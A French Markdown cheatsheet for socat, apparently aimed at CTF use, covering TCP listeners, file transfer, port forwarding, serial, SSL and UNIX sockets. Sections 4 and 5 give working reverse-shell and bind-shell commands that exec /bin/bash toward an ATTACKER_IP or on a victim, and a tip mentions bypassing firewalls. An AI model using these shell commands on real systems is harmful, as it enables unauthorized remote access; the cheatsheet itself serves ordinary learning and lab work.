# 📜 Socat Cheatsheet

## 📌 Commande générale
```bash
socat [OPTIONS] <endpoint1> <endpoint2>
````

* **endpoint** = type de connexion (TCP, UDP, FILE, EXEC, PTY, SSL…)
* Options utiles :

  * `-d -d` → debug
  * `-v` → verbose
  * `-T` → timeout

---

## 🔹 1. Serveur TCP simple

```bash
socat -v TCP-LISTEN:4444,reuseaddr,fork STDOUT
```

* `reuseaddr` : réutiliser le port
* `fork` : gérer plusieurs clients

---

## 🔹 2. Client TCP simple

```bash
socat -v STDIN TCP:192.168.1.10:4444
```

---

## 🔹 3. Chat bidirectionnel (Netcat-like)

**Serveur :**

```bash
socat TCP-LISTEN:4444,reuseaddr,fork STDIO
```

**Client :**

```bash
socat STDIO TCP:serveur:4444
```

---

## 🔹 4. Reverse shell

**Victime → Attaquant :**

```bash
socat TCP:ATTACKER_IP:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

**Attaquant (réception) :**

```bash
socat TCP-LISTEN:4444,reuseaddr,fork STDOUT
```

---

## 🔹 5. Bind shell

**Victime :**

```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

**Attaquant :**

```bash
socat STDIO TCP:VICTIM_IP:4444
```

---

## 🔹 6. Transfert de fichier

**Serveur (envoi) :**

```bash
socat TCP-LISTEN:4444,reuseaddr,fork FILE:fichier.txt
```

**Client (réception) :**

```bash
socat TCP:IP:4444 FILE:recup.txt,create
```

---

## 🔹 7. Redirection de port

```bash
socat TCP-LISTEN:8080,reuseaddr,fork TCP:10.0.0.5:80
```

---

## 🔹 8. Port série

```bash
socat -d -d FILE:/dev/ttyUSB0,b115200 STDOUT
```

---

## 🔹 9. SSL/TLS

**Client SSL :**

```bash
socat - OPENSSL:example.com:443,verify=0
```

**Serveur SSL :**

```bash
socat OPENSSL-LISTEN:443,reuseaddr,cert=cert.pem,key=key.pem TCP:127.0.0.1:80
```

---

## 🔹 10. Socket UNIX

**Client :**

```bash
socat - UNIX-CONNECT:/tmp/socket.sock
```

**Serveur :**

```bash
socat UNIX-LISTEN:/tmp/socket.sock,fork STDOUT
```

---

## 💡 Astuces

* `-v` : afficher les données transférées.
* `pty` : shell interactif correct.
* `fork` : indispensable pour gérer plusieurs connexions.
* `socat` peut aider à bypasser un firewall si les ports sortants sont ouverts.

---

ncore plus pratique en CTF.
```
